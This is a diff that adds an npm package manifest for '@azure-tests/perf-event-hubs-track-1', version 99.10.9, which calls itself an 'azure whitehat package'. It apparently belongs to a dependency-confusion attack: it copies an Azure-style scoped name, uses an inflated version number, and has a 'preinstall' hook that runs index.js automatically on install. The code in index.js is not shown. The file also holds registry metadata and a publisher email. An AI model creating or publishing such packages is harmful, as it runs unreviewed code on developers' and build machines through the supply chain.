@@ -1,0 +1,39 @@
+{
+    "name": "@azure-tests/perf-event-hubs-track-1",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "@azure-tests/perf-event-hubs-track-1@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-ITTyYKtxvGtkVgu72ZarveSC8dVGMGsQkyaesEYJOxfqvGb8fRwDEvFv87IZCz/7mSvfrbM5/lZLPCI/LVyVXw==",
+        "shasum": "f063a93fadd7fd3970d2b99ed7bb41d48098d863",
+        "tarball": "https://registry.npmjs.org/@azure-tests/perf-event-hubs-track-1/-/perf-event-hubs-track-1-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3600,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSP9CRA9TVsSAnZWagAAv7wP/3EtZIe0M3IJaYtVpgC4\naif+Cp7utKgyxSz+BAIusQ2X/IRhWyz3Ym+WS5ReyPoBt1b+VJW0TgOYdPCa\nu/Eg9vVa9FDTY2JJo+pzNh1RtAEbGgJv/NlI0878zkRDzPJeLnYYgudoZFnI\nWKi5d2is+DWFzlLqY0tQWVNl7rOUItYbLZoGOirNEw0ZflVZ5LkhFr9UUf4u\nF+A1bWHjPTe0x3xF6aVp60xUsajAVJ5MmdQup21LYQlCorU2uwUzkFitSv3+\nX0v9KWd5kImNkhrxbNhxbVh263pE+JoENY4lRcMmEkDs+hx5xI1DoabG9Moy\nh2wEn5v93rl1DsfsqJKealsgIS5CN0Nl7wXIYFy6G5cPEOvMXPmT3ubiRt5A\nhAyOOLp12RjL+yao3LzeVVxFXYNSSsnoQpqBsbnZt85ygQUQDXsD+CHG1rMN\nXD0R+sX5Jpp7c77oiMKRXVNT//fBvs9YcnM1Zxp7YZ8iKZ/UQ/KmWP2Lxrwv\ndHJp4Vg9OU9AXM7bmK9UNDWhJyJpYaicFkGCjtDesDZgIiiVm3b2dCb13Pwh\nwVLjG6MoYWOLqgSyhQEgGlxa4w0RL8Kbb1ZmYb2k9G+o1W32TDHIitorK2sE\n5DsFVvOrdzeKROKyne7ejZpRjSOc+qMXHxApt4btrtthEp+w7+cUCo4iTTNw\nIYTs\r\n=AR4D\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-event-hubs-track-1_99.10.9_1637950461361_0.6682748585957745"
+    },
+    "_hasShrinkwrap": false
+}
